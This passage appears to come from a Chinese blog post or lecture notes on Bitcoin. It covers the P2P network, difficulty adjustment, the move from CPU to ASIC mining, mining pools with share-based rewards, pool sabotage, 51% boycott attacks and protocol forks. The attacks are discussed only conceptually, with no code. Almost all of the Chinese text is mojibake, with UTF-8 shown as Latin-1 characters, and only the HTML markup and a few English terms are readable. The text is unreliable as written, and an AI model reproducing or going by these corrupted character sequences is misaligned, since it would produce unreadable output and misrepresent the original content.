<p>ä¸¤ä¸ªç¬¦åˆè¦æ±‚çš„çŸ¿å·¥ï¼ŒåŒæ—¶è®¡ç®—åˆ°äº†nonceå¹¶å¹¿æ’­ï¼Œåœ¨åŒºå—é“¾ç½‘ç»œä¸­ï¼Œæœ‰ä¸€éƒ¨åˆ†äººä¼šæ¥å—ä¸Šé¢çš„åŒºå—ï¼Œä¸€éƒ¨åˆ†ä¼šæ¥å—ä¸‹é¢çš„ï¼Œåˆ†åˆ«ç”¨ä¸Šé¢åŒºå—çš„å“ˆå¸Œå€¼ä½œä¸ºçˆ¶å“ˆå¸Œè¿›è¡Œè®¡ç®—ï¼Œéšç€æ—¶é—´æ¨ç§»ï¼Œæ€»æœ‰ä¸€æ¡é“¾èƒœå‡ºï¼ˆä»–çš„å­èŠ‚ç‚¹å…ˆæŒ–åˆ°çŸ¿å¹¶æ‰“åŒ…ï¼‰ï¼Œæˆä¸ºæœ€é•¿åˆæ³•é“¾ï¼Œç”±æ­¤ä¿è¯äº†åŒºå—é“¾çš„ä¸€è‡´æ€§ï¼Œè€Œè¢«æŠ›å¼ƒçš„åŒºå—ç§°ä¸º orphan block ï¼ˆå­¤å„¿åŒºå—ï¼Œæ²¡æœ‰å¤§çˆ¹ç®—å‡ºæ¥ï¼Œæ˜¯è¿™æ ·çš„ï¼‰ï¼Œå…¶ä¸­çš„äº¤æ˜“å°±è¢«å…¨éƒ¨å›æ»šäº†ã€‚</p>

<h2 id="æ¯”ç‰¹å¸ç³»ç»Ÿçš„å®ç°">æ¯”ç‰¹å¸ç³»ç»Ÿçš„å®ç°</h2>

<p>ä¸Šä¸€èŠ‚æˆ‘ä»¬è¯´åˆ°æ¯”ç‰¹å¸é‡‡ç”¨äº¤æ˜“æ¨¡å¼æ˜¯transaction-based ledgerï¼Œå› ä¸ºç³»ç»Ÿä¸­å¹¶æ²¡æœ‰æ˜¾ç¤ºè®°å½•æ¯ä¸ªè´¦æˆ·çš„æ¯”ç‰¹å¸æ•°ç›®ï¼Œéœ€è¦é€šè¿‡äº¤æ˜“å›æº¯æ¨ç®—ã€‚å› æ­¤ï¼Œåœ¨æ¯”ç‰¹å¸ç³»ç»Ÿä¸­ç»´æŠ¤äº†ä¸€ä¸ª <strong>UTXO(Unspent Transaction Output)</strong>:å°šæœªè¢«èŠ±æ‰çš„äº¤æ˜“ã€‚</p>

<p>åé¢çš„å†…å®¹æ¯”è¾ƒç®€å•ï¼Œä»‹ç»äº†ä¸€äº›å…·ä½“çš„åŒºå—ä¿¡æ¯å’Œäº¤æ˜“ä¿¡æ¯ï¼Œå®‰å…¨æ€§åˆ†æä¹Ÿéƒ½æ˜¯å…±è¯†ä¸­è°ˆè¿‡çš„å†…å®¹ï¼Œå°±ä¸è®°å½•äº†ã€‚</p>

<h2 id="æ¯”ç‰¹å¸ç½‘ç»œ">æ¯”ç‰¹å¸ç½‘ç»œ</h2>

<p>åœ¨ç½‘ç»œä¸­éœ€è¦ä¼ æ’­ä¸¤ç§ä¿¡æ¯ï¼šæ–°å‘å¸ƒäº¤æ˜“çš„ä¿¡æ¯å’Œæ–°å‘å¸ƒåŒºå—çš„ä¿¡æ¯ã€‚</p>

<p>æ¯”ç‰¹å¸å·¥ä½œäºåº”ç”¨å±‚ï¼Œå…¶ç½‘ç»œå±‚ä¸ºä¸€ä¸ªP2P overlay networkã€‚æ¯”ç‰¹å¸ç³»ç»Ÿä¸­æ‰€æœ‰èŠ‚ç‚¹å®Œå…¨å¹³ç­‰ï¼Œè¦æƒ³åŠ å…¥ç½‘ç»œï¼Œè‡³å°‘éœ€è¦çŸ¥é“ä¸€ä¸ªç§å­èŠ‚ç‚¹ï¼Œé€šè¿‡ç§å­èŠ‚ç‚¹å‘ŠçŸ¥ä»–æ‰€çŸ¥é“çš„å…¶ä»–èŠ‚ç‚¹ã€‚å½“èŠ‚ç‚¹ç¦»å¼€æ—¶ï¼Œåªéœ€è‡ªè¡Œé€€å‡ºï¼Œå…¶ä»–èŠ‚ç‚¹ä¸€å®šæ—¶é—´æ²¡æœ‰æ”¶åˆ°è¯¥èŠ‚ç‚¹ä¿¡æ¯ä¾¿ä¼šè‡ªè¡Œåˆ é™¤ã€‚</p>

<p>æ¯”ç‰¹å¸ç½‘ç»œè®¾è®¡åŸåˆ™ï¼š<strong>simpleã€robustã€but not efficient</strong>ã€‚æ¯ä¸ªèŠ‚ç‚¹ç»´æŠ¤ä¸€ä¸ªé‚»èŠ‚ç‚¹é›†åˆï¼Œæ¶ˆæ¯ä¼ æ’­åœ¨ç½‘ç»œä¸­é‡‡ç”¨flood æ¨¡å¼ï¼ŒæŸä¸ªèŠ‚ç‚¹åœ¨æ”¶åˆ°ä¸€æ¡æ¶ˆæ¯ä¼šå°†å…¶å‘é€ç»™æ‰€æœ‰é‚»å±…èŠ‚ç‚¹å¹¶æ ‡è®°ï¼Œä¸‹æ¬¡å†æ”¶åˆ°ä¾¿ä¸ä¼šå†å‘é€è¯¥æ¶ˆæ¯ï¼Œä»¥å…æ¶ˆæ¯æ— é™å¾ªç¯ã€‚é‚»å±…èŠ‚ç‚¹é€‰å–éšæœºï¼Œæœªè€ƒè™‘ç½‘ç»œåº•å±‚æ‹“æ‰‘ç»“æ„ï¼Œä¹Ÿä¸ç°å®ä¸–ç•Œç‰©ç†åœ°å€æ— å…³ã€‚è¯¥ç½‘ç»œå…·æœ‰æå¼ºé²æ£’æ€§ï¼Œä½†ç‰ºç‰²äº†ç½‘ç»œæ•ˆç‡ã€‚</p>

<p>å¦‚æœæœ‰ä¸¤ä¸ªå†²çªäº¤æ˜“ A-&gt;B å’Œ A-&gt;Cï¼ˆèŠ±è´¹åŒä¸€ç¬”é’±ï¼‰ï¼Œå–å†³äºèŠ‚ç‚¹å…ˆæ”¶åˆ°å“ªä¸ªäº¤æ˜“ï¼Œå®å¤–ä¸€ä¸ªå°†æŠ›å¼ƒã€‚</p>

<h2 id="æ¯”ç‰¹å¸çš„æŒ–çŸ¿éš¾åº¦è°ƒæ•´å’Œå†å²">æ¯”ç‰¹å¸çš„æŒ–çŸ¿éš¾åº¦è°ƒæ•´å’Œå†å²</h2>

<p>åœ¨æ¯”ç‰¹å¸ç³»ç»Ÿä¸­ï¼Œå¹³å‡å‡ºå—æ—¶é—´ä¿æŒåˆ°10min å·¦å³ï¼Œéšç€æŒ–çŸ¿çš„äººå¢å¤šä»¥åŠè®¾å¤‡çš„å¼ºå¤§ï¼Œç³»ç»Ÿæ€»ç®—åŠ›ä¸æ–­å¢å¼ºï¼Œè¦æƒ³ä¿æŒå‡ºå—æ—¶é—´å°±å¾—å¯¹æŒ–çŸ¿çš„éš¾åº¦åšå‡ºè°ƒæ•´ã€‚</p>

<h3 id="æŒ–çŸ¿éš¾åº¦è°ƒæ•´">æŒ–çŸ¿éš¾åº¦è°ƒæ•´</h3>

<p>ä¹‹å‰è¯´åˆ°æŒ–çŸ¿å°±æ˜¯ä¸æ–­å°è¯• block header ä¸­çš„ nonce å€¼ï¼Œä½¿å¾—æ•´ä¸ª block header å¯¹ä¸¤æ¬¡å“ˆå¸Œå€¼å°äº target ï¼Œé‚£ä¹ˆè°ƒæ•´æŒ–çŸ¿éš¾åº¦ï¼Œå…¶å®å°±æ˜¯è°ƒæ•´ target ã€‚</p>

<p>å¯¹äºæŒ–çŸ¿éš¾åº¦ï¼Œæœ‰ä»¥ä¸‹å‡ ä¸ªé—®é¢˜ï¼š</p>

<ol>
  <li>
    <p>å¦‚æœä¸è°ƒæ•´æŒ–çŸ¿éš¾åº¦ä¼šæ€ä¹ˆæ ·ï¼Ÿ</p>

    <blockquote>
      <p>éšç€ç³»ç»Ÿç®—åŠ›çš„å¢å¼ºï¼ŒæŒ–çŸ¿éš¾åº¦ä¸å˜ï¼Œå‡ºå—æ—¶é—´ä¼šè¶Šæ¥è¶ŠçŸ­ã€‚</p>
    </blockquote>
  </li>
  <li>
    <p>å‡ºå—æ—¶é—´è¶Šæ¥è¶ŠçŸ­æ˜¯å¥½äº‹å—ï¼Ÿ</p>

    <blockquote>
      <p>å‡ºå—æ—¶é—´çŸ­çš„å¥½å¤„æ˜¯äº¤æ˜“å¾ˆå¿«èƒ½è¢«å†™å…¥åŒºå—é“¾ï¼Œæé«˜äº†åŒºå—é“¾çš„æ•ˆç‡ã€‚ä½†æ˜¯é—®é¢˜æ˜¯åŒºå—é“¾ç½‘ç»œä¼ æ’­æœ‰æ—¶å»¶ï¼Œå¦‚æœå‡ºå—æ—¶é—´çŸ­ä¼šä½¿å¾—ç³»ç»Ÿä¸­çš„èŠ‚ç‚¹ç»å¸¸å¤„äºä¸ä¸€è‡´çš„çŠ¶æ€ï¼Œå¢åŠ äº†ç³»ç»Ÿçš„ä¸ç¨³å®šæ€§ï¼Œè¿™ç§ä¸ç¨³å®šæ€§ä¼šå¯¼è‡´åŒºå—åˆ†å‰çŠ¶æ€è¿‡å¤šï¼Œä¸åˆ©äºè¾¾åˆ°å…±è¯†ï¼Œé€ æˆç®—åŠ›åˆ†æ•£ï¼Œé»‘å®¢å¦‚æœé›†ä¸­æ”»å‡»çš„æˆæœ¬ä¼šå¤§å¤§é™ä½ã€‚</p>
    </blockquote>
  </li>
</ol>

<h3 id="æŒ–çŸ¿å†å²">æŒ–çŸ¿å†å²</h3>

<p>åˆ—ä¸€ä¸‹å…¨èŠ‚ç‚¹å’Œè½»èŠ‚ç‚¹çš„åŒºåˆ«ï¼š</p>

<table>
  <thead>
    <tr>
      <th style="text-align: center">å…¨èŠ‚ç‚¹</th>
      <th style="text-align: center">è½»èŠ‚ç‚¹</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center">ä¸€ç›´åœ¨çº¿</td>
      <td style="text-align: center">ä¸æ˜¯ä¸€ç›´åœ¨çº¿</td>
    </tr>
    <tr>
      <td style="text-align: center">åœ¨æœ¬åœ°ç¡¬ç›˜ä¸Šç»´æŠ¤å®Œæ•´åŒºå—é“¾ä¿¡æ¯</td>
      <td style="text-align: center">ä¸ä¿å­˜æ•´ä¸ªåŒºå—é“¾ï¼Œåªéœ€è¦ä¿å­˜æ¯éš”åŒºå—å—å¤´</td>
    </tr>
    <tr>
      <td style="text-align: center">åœ¨å†…å­˜ä¸­ç»´æŠ¤UTXOé›†åˆï¼Œä»¥ä¾¿äºå¿«é€Ÿæ£€éªŒäº¤æ˜“åˆæ³•æ€§</td>
      <td style="text-align: center">ä¸ä¿å­˜å…¨éƒ¨äº¤æ˜“ï¼Œåªä¿å­˜å’Œè‡ªå·±æœ‰å…³çš„äº¤æ˜“</td>
    </tr>
    <tr>
      <td style="text-align: center">ç›‘å¬æ¯”ç‰¹å¸ç½‘ç»œä¸­äº¤æ˜“å†…å®¹ï¼ŒéªŒè¯æ¯ä¸ªäº¤æ˜“åˆæ³•æ€§</td>
      <td style="text-align: center">æ— æ³•éªŒè¯å¤§å¤šæ•°äº¤æ˜“åˆæ³•æ€§ï¼Œåªèƒ½æ£€éªŒå’Œè‡ªå·±ç›¸å…³çš„äº¤æ˜“åˆæ³•æ€§</td>
    </tr>
    <tr>
      <td style="text-align: center">å†³å®šå“ªäº›äº¤æ˜“ä¼šæ‰“åŒ…åˆ°åŒºå—ä¸­</td>
      <td style="text-align: center">æ— æ³•æ£€æµ‹ç½‘ä¸Šå‘å¸ƒçš„åŒºå—æ­£ç¡®æ€§</td>
    </tr>
    <tr>
      <td style="text-align: center">ç›‘å¬å…¶ä»–çŸ¿å·¥æŒ–å‡ºçš„åŒºå—ï¼ŒéªŒè¯å…¶åˆæ³•æ€§</td>
      <td style="text-align: center">å¯ä»¥éªŒè¯æŒ–çŸ¿éš¾åº¦</td>
    </tr>
    <tr>
      <td style="text-align: center">æŒ–çŸ¿ï¼š<br />1 . å†³å®šæ²¿ç€å“ªæ¡é“¾æŒ–ä¸‹å»ã€‚<br />2. å½“å‡ºç°ç­‰é•¿åˆ†å‰ï¼Œé€‰æ‹©å“ªä¸€ä¸ªåˆ†å‰</td>
      <td style="text-align: center">åªèƒ½æ£€æµ‹å“ªä¸ªæ˜¯æœ€é•¿é“¾ï¼Œä¸çŸ¥é“å“ªä¸ªæ˜¯æœ€é•¿åˆæ³•é“¾</td>
    </tr>
  </tbody>
</table>

<p>ç›®å‰æŒ–çŸ¿è¶Šæ¥è¶Šè¶‹è¿‘äºä¸“ä¸šåŒ–ï¼Œæ€»ä½“åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼Œä»é€šç”¨æ¼”å˜ä¸ºä¸“ç”¨ï¼š</p>

<ol>
  <li>
    <p>CPUé˜¶æ®µ</p>

    <blockquote>
      <p>æ—©æœŸï¼Œå¾ˆå¤šäººä½¿ç”¨è‡ªå·±çš„ä¸ªäººç”µè„‘æŒ–çŸ¿ï¼Œä½†æŒ–çŸ¿è¿‡ç¨‹ä¸­å¤§å¤šæ•°çš„å†…å­˜ï¼Œç¡¬ç›˜ä»¥åŠCPUçš„å¤§éƒ¨åˆ†ç»„ä»¶ï¼ˆå› ä¸ºæŒ–çŸ¿æ±‚è§£æœ¬èº«è¿ç”¨åˆ°çš„æŒ‡ä»¤å°±å¾ˆå°‘ï¼‰éƒ½æ˜¯é—²ç½®çŠ¶æ€ï¼Œéšç€æŒ–çŸ¿éš¾åº¦çš„æé«˜ï¼Œç”¨CPUæŒ–çŸ¿æ ¹æœ¬ä¸åˆ’ç®—ã€‚</p>
    </blockquote>
  </li>
  <li>
    <p>GPUé˜¶æ®µ</p>

    <blockquote>
      <p>GPUä¸»è¦ç”¨ä½œå¤§è§„æ¨¡å¹¶è¡Œè®¡ç®—ï¼Œå¦‚æ·±åº¦å­¦ä¹ ï¼Œä½†GPUæŒ–çŸ¿è¿˜æ˜¯æœ‰ä¸€å®šçš„æµªè´¹ï¼Œæ¯”å¦‚æŒ–çŸ¿åªä½¿ç”¨æ•´æ•°ï¼Œæµ®ç‚¹æ•°è¿ç®—çš„éƒ¨ä»¶å°†ä¼šé—²ç½®ã€‚</p>
    </blockquote>
  </li>
  <li>
    <p>ASICèŠ¯ç‰‡ï¼ˆ<strong>Application Specific Integrated Circuit</strong>ï¼‰é˜¶æ®µ</p>

    <blockquote>
      <p>è¿™ç§èŠ¯ç‰‡ç›¸å½“äºé’ˆå¯¹ä¸€ç±»æŒ–çŸ¿çš„æ±‚è§£é—®é¢˜ï¼ˆmining puzzleï¼‰è¿›è¡Œé’ˆå¯¹æ€§è®¾è®¡ã€‚</p>
    </blockquote>
  </li>
</ol>

<p><strong>ASICèŠ¯ç‰‡çš„å‡ºç°æ˜¯å¥½äº‹å—ï¼Ÿ</strong></p>

<blockquote>
  <p>ASICèŠ¯ç‰‡ä¸æ˜¯æ¯ä¸ªäººéƒ½èƒ½å‚ä¸è¿›æ¥ï¼Œä¸€å®šç¨‹åº¦ä¸Šæé«˜äº†æŒ–çŸ¿çš„é—¨æ§›ï¼Œè¿™ä¸å»ä¸­å¿ƒåŒ–ç›¸è¿èƒŒã€‚å¹¶ä¸”ASICçš„å®šåˆ¶å¼€å‘éœ€è¦å¾ˆé•¿çš„å‘¨æœŸï¼ˆå¤§äºä¸€å¹´ï¼‰ï¼Œå¦‚æœè¿™ä¸ªæ—¶é—´å†…å¯¹åº”å¸çš„ä»·å€¼å¤§å¹…åº¦è´¬å€¼ä»·æ ¼è·³æ°´ï¼ŒæŠ•å…¥çš„æˆæœ¬å°†è¡€æœ¬æ— å½’ã€‚</p>

  <p>ç†æƒ³çŠ¶æ€ä¸‹ï¼Œæ‰€æœ‰äººåº”è¯¥éƒ½å¯ä»¥ç”¨å®¶ç”¨è®¡ç®—æœº CPU è¿›è¡ŒæŒ–çŸ¿ï¼Œåç»­ä¸€äº›è´§å¸å°±è€ƒè™‘äº†è¿™ä¸ªé—®é¢˜ï¼Œè®¾è®¡äº†å¯¹æŠ— ASIC èŠ¯ç‰‡åŒ–çš„è§£å†³æ–¹æ¡ˆï¼Œåç»­çš„ä»¥å¤ªåŠå°±ä¼šä»‹ç»åˆ°ã€‚</p>
</blockquote>

<p>å¯¹äºå•ä¸ªçš„çŸ¿å·¥è€Œè¨€ï¼Œå³ä½¿ä½¿ç”¨äº†ASICèŠ¯ç‰‡ï¼Œå…¶ç®—åŠ›åœ¨æ•´ä¸ªç³»ç»Ÿä¸­ä»ç„¶æ˜¯å¾ˆå°çš„ä¸€éƒ¨åˆ†ï¼Œå¹¶ä¸”ä»–è¿˜éœ€è¦æ‹…ä»»å…¨èŠ‚ç‚¹çš„å…¶ä»–è´£ä»»ï¼Œé€ æˆäº†ç®—åŠ›çš„æµªè´¹ã€‚</p>

<p>å› æ­¤ï¼Œåé¢å˜å½¢æˆäº†çŸ¿æ± çš„æ¦‚å¿µï¼š</p>

<p><img src="../../assets/images/image-20220618201028144.png" alt="image-20220618201028144" /></p>

<p>ä¸€ä¸ªç®€å•çš„çŸ¿æ± å¦‚ä¸Šï¼šä¸€ä¸ªå…¨èŠ‚ç‚¹é©±åŠ¨å¤šå°çŸ¿æœºã€‚çŸ¿å·¥åªéœ€è¦ä¸æ–­çš„è®¡ç®—å“ˆå¸Œå³å¯ï¼Œå…¶ä»–å…¨èŠ‚ç‚¹çš„è´£ä»»ç”±çŸ¿ä¸»æ‰¿æ‹…ï¼Œå½“è·å¾—æ”¶ç›Šåï¼Œå¯¹æ‰€æœ‰çŸ¿å·¥è¿›è¡Œåˆ†é…ã€‚</p>

<p>çŸ¿æ± ä¸€èˆ¬æœ‰ä¸¤ç§ç»„ç»‡å½¢å¼ï¼Œä¸€æ˜¯åŒä¸€æœºæ„å¯¹å¤§è§„æ¨¡æ•°æ®ä¸­å¿ƒç»Ÿä¸€æŒ–çŸ¿ï¼ŒäºŒæ˜¯åˆ†å¸ƒå¼ï¼ŒçŸ¿ä¸»å’ŒçŸ¿å·¥ä¸è®¤è¯†ï¼ŒçŸ¿å·¥è‡ªæ„¿åŠ å…¥çŸ¿æ± ï¼ŒçŸ¿ä¸»åˆ†é…ä»»åŠ¡ï¼Œä½†è¿™ä¸€ç§æƒ…å†µçš„è¯åˆ©ç›Šçš„åˆ†é…å°±æˆäº†ä¸€ä¸ªé—®é¢˜ï¼š</p>

<ol>
  <li>
    <p>å¹³å‡åˆ†é…ï¼Œæ‰€æœ‰äººå¹³åˆ†å‡ºå—å¥–åŠ±</p>

    <blockquote>
      <p>è¿™æ ·è‚¯å®šä¸è¡Œï¼Œé¦–å…ˆä¸åŒçŸ¿å·¥çš„ç®—åŠ›æœ‰æ‰€å·®è·ï¼Œè€Œä¸”è¿™ç§ ã€ åƒå¤§é”…é¥­ ã€çš„æ–¹å¼è‚¯å®šä¼šè®©æœ‰ä¸€äº›çŸ¿å·¥å·æ‡’ï¼Œæ‰€ä»¥éœ€è¦æŒ‰åŠ³åˆ†é…ï¼Œè¦æœ‰ä¸€ä¸ªå·¥ä½œé‡è¯æ˜çš„åˆ¶åº¦ã€‚</p>
    </blockquote>
  </li>
  <li>
    <p>æŒ‰åŠ³è®¡ç®—ï¼Œæ ¹æ®å·¥ä½œé‡åˆ†é…</p>

    <blockquote>
      <p>å‡è®¾åŸæœ¬çš„æŒ–çŸ¿éš¾åº¦æ˜¯è®¡ç®—æ‰€å¾—å‰70ä½ä¸º0ï¼Œç°åœ¨é™ä½è¦æ±‚åªéœ€å‰60ä½ï¼Œè¿™æ ·æŒ–çŸ¿æ›´åŠ å®¹æ˜“ï¼Œå½“ç„¶è¿™ä¸ªå“ˆå¸Œæœ¬èº«æ˜¯æ²¡æœ‰ç”¨çš„ï¼Œå¹¶ä¸æ»¡è¶³æŒ–çŸ¿çš„æ¡ä»¶ï¼Œæˆ‘ä»¬æŠŠå…¶ç§°ä¸ºä¸€ä¸ª <strong>share</strong> ï¼Œæˆ–è€… <strong>almost valid share</strong>ï¼ŒçŸ¿å·¥æ²¡æŒ–åˆ°ä¸€ä¸ªshareï¼Œä¾¿æäº¤ç»™çŸ¿ä¸»ï¼Œä½œä¸ºå…¶å·¥ä½œé‡çš„è¯æ˜ï¼Œç­‰æŸä¸ªçŸ¿å·¥çœŸæ­£æŒ–åˆ°ç¬¦åˆæ¡ä»¶çš„åŒºå—åï¼Œå†æ ¹æ®çŸ¿å·¥æ‰€æäº¤çš„çš„shareæ‰€åˆ†é…ã€‚</p>
    </blockquote>
  </li>
</ol>

<p>æ³¨æ„ï¼Œæ¯ä¸ªçŸ¿å·¥æŒ–çŸ¿éƒ½æ˜¯ <strong>éšæœºçš„</strong> ç”Ÿæˆnonceå¹¶å°è¯•ï¼Œä¸ä¼šè¯´æˆ‘ä»1-10000è¿™ä¸ªåŒºé—´å°è¯•ï¼Œä½ ä»10001åˆ°20000è¿™æ ·ï¼Œæ‰€æœ‰äººéƒ½æ˜¯éšæœºçš„ï¼Œå°½ç®¡å¯èƒ½ä¼šé‡åˆï¼ˆæ¦‚ç‡ä¹Ÿå¾ˆä½ï¼‰ã€‚</p>

<p>åŒæ—¶ï¼Œä¸€ä¸‹å‡ ç§æƒ…å†µä¹Ÿéœ€è¦è€ƒè™‘ï¼š</p>

<ol>
  <li>
    <p>ä¼šä¸ä¼šå­˜åœ¨æœ‰çŸ¿å·¥å¹³æ—¶æ­£å¸¸æŒ–çŸ¿äº¤shareï¼Œä½†æ˜¯æŒ–åˆ°çœŸæ­£çš„çŸ¿ä¸æ˜¯äº¤ç»™çŸ¿ä¸»è€Œæ˜¯è‡ªå·±å·å·å‘å¸ƒå‡ºå»ï¼ˆç§åï¼‰</p>

    <blockquote>
      <p>è¿™ç§æƒ…å†µä¸å¯èƒ½ï¼ŒçŸ¿ä¸»ç»„è£…åŒºå—äº¤ç»™çŸ¿å·¥è®¡ç®—ï¼Œå…¶ä¸­é“¸å¸äº¤æ˜“çš„æ”¶æ¬¾åœ°å€æ˜¯çŸ¿ä¸»ï¼Œå¦‚æœçŸ¿å·¥ä¿®æ”¹æ”¹åœ°å€ï¼Œå…¶nonceä¹Ÿä¼šå¤±å»å…¶æ„ä¹‰ã€‚</p>
    </blockquote>
  </li>
  <li>
    <p>ä¼šä¸ä¼šæœ‰çŸ¿å·¥æ£ä¹±ï¼Œå¹³æ—¶æäº¤shareï¼ŒæŒ–åˆ°åŒºå—åè€Œæ‰”æ‰ä¸æäº¤ã€‚</p>

    <blockquote>
      <p>è¿™ç§æƒ…å†µæ˜¯æœ‰å¯èƒ½çš„ï¼Œå¦‚æœçŸ¿å·¥æœ¬èº«æƒ³æ£ä¹±ï¼Œå¯ä»¥è¿™ä¹ˆåšï¼Œè™½ç„¶å¯¹ä»–è‡ªèº«æ¥è¯´æ²¡æœ‰ä»»ä½•è·åˆ©ï¼ŒæŸäººä¸åˆ©å·±ã€‚</p>

      <p>ä½†æ˜¯çŸ¿æ± ç›´æ¥æ˜¯å­˜åœ¨ç«äº‰å…³ç³»çš„ï¼Œä¸ºäº†æ‰“å‡»ç«äº‰å¯¹æ‰‹å¯èƒ½æ’çŸ¿æœºåŠ å…¥å¯¹æ–¹çŸ¿æ± æŒ–çŸ¿ï¼Œåªå‚ä¸å…¶ä»–çŸ¿å·¥æŒ–çŸ¿åˆ†çº¢ï¼Œè‡ªå·±æŒ–åˆ°çš„åŒºå—å´ä¸¢æ‰ä¸ç»™ä»–äººåˆ†ã€‚</p>
    </blockquote>
  </li>
</ol>

<p>éšç€çŸ¿æ± çš„å‡ºç°ï¼Œç®—åŠ›ä¹Ÿå˜å¾—é›†ä¸­èµ·æ¥ï¼Œåœ¨2014å¹´æ›¾æœ‰ä¸€ä¸ªåå« ã€ GHash ã€çš„çŸ¿æ± è¾¾åˆ°äº†é«˜è¾¾ 51%çš„ç®—åŠ›ï¼š</p>

<p><img src="../../assets/images/image-20220619003824934.png" alt="image-20220619003824934" /></p>

<p>æˆ‘ä»¬ä¹‹å‰è¯´åˆ°å¦‚æœç®—åŠ›è¾¾åˆ°51%å°±æœ‰å¯èƒ½å¯ä»¥å‘èµ·åˆ†å‰æ”»å‡»ï¼Œå¦‚æœæ”»å‡»è€…ä¸å–œæ¬¢æŸä¸ªè´¦æˆ·Aï¼Œåœ¨ç›‘å¬åˆ°Aå°†äº¤æ˜“å‘å¸ƒåˆ°åŒºå—é“¾åï¼Œç«‹é©¬å‘åŠ¨åˆ†å‰æ”»å‡»ä½¿Aæ— æ³•æˆä¸ºæœ€é•¿åˆæ³•é“¾ï¼Œè¿™æ ·ä¾¿å®ç°å¯¹å¯¹Açš„å°é”ï¼ˆ<strong>Boycott</strong>ï¼‰ã€‚</p>

<p>å¯è§çŸ¿æ± çš„å‡ºç°å¨èƒäº†åŒºå—é“¾å»ä¸­å¿ƒåŒ–çš„ç‰¹æ€§ï¼Œä¹‹å GHash ä¸»åŠ¨é™ä½äº†çŸ¿æ± ç®—åŠ›ï¼Œé¿å…åŠ¨æ‘‡äººä»¬å¯¹æ¯”ç‰¹å¸çš„ä¿¡å¿ƒã€‚</p>

<p>å¦‚æœçŸ¿æ± è¡¨é¢ä¸Šæ˜¯å®‰å…¨çš„ï¼Œå®é™…ä¸ŠæŸä¸ªæœºæ„æ‹¥æœ‰è¶…è¿‡ç™¾åˆ†ä¹‹50çš„ç®—åŠ›ï¼Œä¸å°†å…¶æ”¾å…¥ä¸€ä¸ªçŸ¿æ± ä¸­è€Œæ˜¯åˆ†æ•£éšè”½ï¼Œè¿˜æ˜¯å¯ä»¥å‘åŠ¨51%ç®—åŠ›çš„æ”»å‡»ã€‚</p>

<h2 id="æ¯”ç‰¹å¸åˆ†å‰">æ¯”ç‰¹å¸åˆ†å‰</h2>

<p>åˆ†å‰æ˜¯æŒ‡åŸæ¥æ¯”ç‰¹å¸ç³»ç»Ÿä¸­çš„ä¸€æ¡é“¾å˜æˆäº†ä¸¤æ¡é“¾ã€‚é€ æˆåˆ†å‰çš„åŸå› æœ‰å¾ˆå¤šï¼Œç®€å•æ¥è¯´æœ‰ä»¥ä¸‹ä¸‰ç§ï¼š</p>

<ol>
  <li>state forkï¼šä¸¤ä¸ªæ—¶é—´å·®ä¸å¤šçš„çŸ¿å·¥åŒæ—¶å‡ºçŸ¿ï¼Œå‘å¸ƒåŒºå—å¯¹æ¯”ç‰¹å¸ç³»ç»Ÿå½“å‰çŠ¶æ€äº§ç”Ÿåˆ†æ­§çš„åˆ†å‰ã€‚</li>
  <li>forking attackï¼šäººä¸ºåˆ†å‰æ”»å‡»é€ æˆçš„åˆ†å‰ã€‚</li>
  <li>protocal forkï¼šæ¯”ç‰¹å¸åè®®æ”¹å˜ï¼Œåœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ä¸æ˜¯æ‰€æœ‰çš„èŠ‚ç‚¹éƒ½è¿›è¡Œå‡çº§ï¼Œå¯¼è‡´åˆ†å‰ã€‚</li>
</ol>

<p>è€Œè¿™ä¸€èŠ‚æ‰€è¯´çš„åˆ†å‰,ä¸»è¦å°±æ˜¯å›´ç»• protocal fork æ‰€å±•å¼€çš„ï¼Œæ¯”ç‰¹å¸åè®®æ”¹å˜ï¼Œç®€å•æ¥è¯´å°±æ˜¯è¿›è¡Œäº†æ›´æ–°ã€‚</p>

<p>å›æƒ³ä¸€ä¸‹æˆ‘ä»¬ç°å®è½¯ä»¶ä¸­æ›´æ–°çš„ä¾‹å­ï¼Œæœ‰çš„è½¯ä»¶ä¼šåœ¨æ‰“å¼€æ—¶æç¤ºä½ æ˜¯å¦è¿›è¡Œæ›´æ–°ï¼Œä½ å¯ä»¥æ ¹æ®äº§å“å˜æ›´è‡ªè¡Œé€‰æ‹©ï¼›æœ‰çš„è½¯ä»¶ä¼šåœ¨ä¸‹è½½æ—¶å°±é»˜è®¤ç¡®è®¤è‡ªåŠ¨æ›´æ–°ï¼Œåœ¨è¿ç½‘çš„æƒ…å†µä¸‹è‡ªåŠ¨è·å–æ•°æ®åŒ…ï¼›æœ‰çš„è½¯ä»¶åœ¨ä½ é€‰æ‹©æ˜¯å¦æ›´æ–°åï¼ˆå¦ï¼‰è‡ªåŠ¨é€€å‡ºï¼Œé»˜è®¤ä¸è¿›è¡Œæ›´æ–°åˆ™æ— æ³•ç»§ç»­ä½¿ç”¨ï¼Œè¿™éƒ½æ˜¯éå¸¸å¸¸è§çš„ä¾‹å­ã€‚</p>

<p>è¯´åˆ°æ›´æ–°å…¶å®ç¦»ä¸å¼€ä¸€ä¸ªå…¼å®¹æ€§çš„é—®é¢˜ï¼Œæˆ‘åœ¨è¿™ä¸ªæ–¹é¢è¢«å°ç»•æ™•äº†ä¸€ä¼šï¼Œä¹Ÿç®€å•è°ˆè°ˆ <strong>å…¼å®¹æ€§çš„å¼‚è®®</strong> <sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup>ï¼š</p>

<p>å…¼å®¹æ€§ä¸»è¦åˆ†ä¸º <strong>å‘å‰å…¼å®¹</strong>ï¼ˆ<strong>Forward Compatibility</strong>ï¼‰å’Œ <strong>å‘åå…¼å®¹</strong> ï¼ˆ<strong>Backward Compatibility</strong>ï¼‰ä¸¤ç§ï¼Œè¿™é‡Œä¸»è¦çš„å¼‚è®®åœ¨äºè‹±æ–‡ä¸­ï¼Œ<strong>å‰å</strong> ä¸¤è¯åœ¨æ—¶é—´ä¸Šå’Œç©ºé—´ä¸Šæ˜¯ç»Ÿä¸€çš„ï¼Œæ¯”å¦‚ <strong>Forward</strong> åœ¨ç©ºé—´ä¸ŠæŒ‡å‰è¿›ï¼Œæ—¶é—´ä¸ŠæŒ‡æœªæ¥ï¼Œè€Œæ±‰è¯­ä¸­ ã€ å‰ ã€ åœ¨ç©ºé—´ä¸ŠæŒ‡å‰è¿›ï¼Œæ—¶é—´ä¸Šé€šå¸¸æŒ‡ä»¥å‰ï¼Œè¿‡å»ã€‚</p>

